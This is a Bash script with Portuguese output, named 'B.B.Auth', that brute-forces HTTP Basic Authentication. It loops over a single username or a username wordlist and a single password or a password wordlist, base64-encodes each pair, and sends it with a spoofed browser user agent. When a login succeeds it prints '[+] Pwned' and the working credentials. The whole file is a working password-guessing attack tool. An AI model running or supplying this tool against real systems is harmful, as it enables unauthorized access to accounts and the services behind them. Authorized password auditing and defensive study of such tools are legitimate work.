#!/bin/bash

VERDE='\033[0;32m'
VERMELHO='\033[0;31m'
NC='\033[0m'
url=$1

declare -r barra="##########"
declare -r tambarra=${#barra}


if [ "$#" -ne 5 ]; then

	echo "Modo de uso: $0 site [ -l / -L ] [ usuario / lista ] [ -p / -P ] [ senha / lista ]"

else

encoding1(){
    enc1=$(echo -n "$user1:$pass1" | base64)
    req=$(curl -o /dev/null -s -w "%{http_code}" -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36" -H "Authorization: Basic $enc1" $url)
    if [ $req -eq 200 ];
    then
	echo -e "${VERDE}[+] Pwned${NC}"
	echo -e "Usuario:${VERDE}$user1${NC} Senha:${VERDE}$pass1${NC}"
	exit 0
    else
	echo -e "${VERMELHO}[-] Não foi possivel acessar a aplicação${NC}"
   fi
}
encoding2(){
    inc=0
    for i in $(cat $pass2);
    do
        enc2=$(echo -n "$user1:$i" | base64)
	req=$(curl -o /dev/null -s -w "%{http_code}" -H "Authorization: Basic $enc2" -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36" $url)
	perc=$((($inc + 1 ) * 100 / $palavrasp))
	percbar=$(($perc * $tambarra / 100))
	
	echo -ne "\\r[${barra:0:percbar}] $perc %"

	((inc++))
    if [ $req -eq 200 ];
    then
	echo
        echo -e "${VERDE}[+] Pwned${NC}"
        echo -e "Usuario:${VERDE}$user1${NC} Senha:${VERDE}$i${NC}"
	exit 0
    fi
    done
    echo
    echo -e "${VERMELHO}[-] Não foi possivel acessar a aplicação${NC}"
}
encoding3(){
    inc=0
    for i in $(cat $user2);
    do
	enc3=$(echo -n "$i:$pass1" | base64)
	req=$(curl -o /dev/null -s -w "%{http_code}" -H "Authorization: Basic $enc3" -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36" $url)
    	perc=$((($inc + 1 ) * 100 / $palavrasu))
        percbar=$(($perc * $tambarra / 100))

        echo -ne "\\r[${barra:0:percbar}] $perc %"
        ((inc++))
    if [ $req -eq 200 ];
    then
	echo
        echo -e "${VERDE}[+] Pwned${NC}"
        echo -e "Usuario:${VERDE}$i${NC} Senha:${VERDE}$pass1${NC}"
        exit 0
    fi
    done
    echo
    echo -e "${VERMELHO}[-] Não foi possivel acessar a aplicação${NC}"
}
encoding4(){
    inc=0
    for i in $(cat $user2);
    do
	for n in $(cat $pass2);
	do
	    enc4=$(echo -n "$i:$n" | base64)
	    req=$(curl -o /dev/null -s -w "%{http_code}" -H "Authorization: Basic $enc4" -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36" $url)
	    perc=$((($inc + 1 ) * 100 / ($palavrasu * $palavrasp)))
            percbar=$(($perc * $tambarra / 100))

            echo -ne "\\r[${barra:0:percbar}] $perc %"
            ((inc++))
    if [ $req -eq 200 ];
    then
	echo
        echo -e "${VERDE}[+] Pwned${NC}"
        echo -e "Usuario:${VERDE}$i${NC} Senha:${VERDE}$n${NC}"
        exit 0
    fi
	done
    done
    echo
    echo -e "${VERMELHO}[-] Não foi possivel acessar a aplicação${NC}"
}


        figlet B.B.Auth
        echo "By: Squ4nch"
        echo
	echo -e "${VERDE}[+] Validando informações${NC}"
	echo "[*] Alvo: $1"
        case $2 in
                -l)
                user1=$3
		echo "[*] Usuario: $3"
		cont=1
                ;;
                -L)
                user2=$3
		echo "[*] Wordlist User: $3"
                palavrasu=$(wc -w $3 | cut -d " " -f1)
		echo "[*] Lista com $palavrasu palavras"
		cont=2
		;;
                *)
                echo -e "${VERMELHO}[-] Opção $2 inválida ${NC}"
		exit 1
                ;;
        esac
        case $4 in
                -p)
                pass1=$5
		echo "[*] Senha: $5"
		cont2=4
                ;;
                -P)
                pass2=$5
		echo "[*] Wordlist Pass: $5"
		palavrasp=$(wc -w $5 | cut -d " " -f1)
                echo "[*] Lista com $palavrasp palavras"
		cont2=6
                ;;
                *)
                echo -e "${VERMELHO}[-] Opção $4 inválida ${NC}"
		exit 1
                ;;
        esac
code=$(curl -o /dev/null -s -w "%{http_code}" -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36" $1)


if [ $code -eq 401 ];
then
    echo -e "${VERDE}[*] Status code: $code${NC}"
    echo -e "${VERDE}[+] Iniciando ataque${NC}"

    ctrl=$(expr $cont + $cont2)
    case $ctrl in
	5)
	encoding1
	;;
	7)
	encoding2
	;;
	6)
	encoding3
	;;
	8)
	encoding4
	;;
    esac
elif [ $code -eq 404 -o $code -eq 000 ];
then
    echo -e "${VERMELHO}[*] Página não existe! Status code: $code${NC}"
    exit 2
else
    echo -e "${VERMELHO}[-] Página sem autenticação! Status code: $code${NC}"
    exit 3
fi

fi
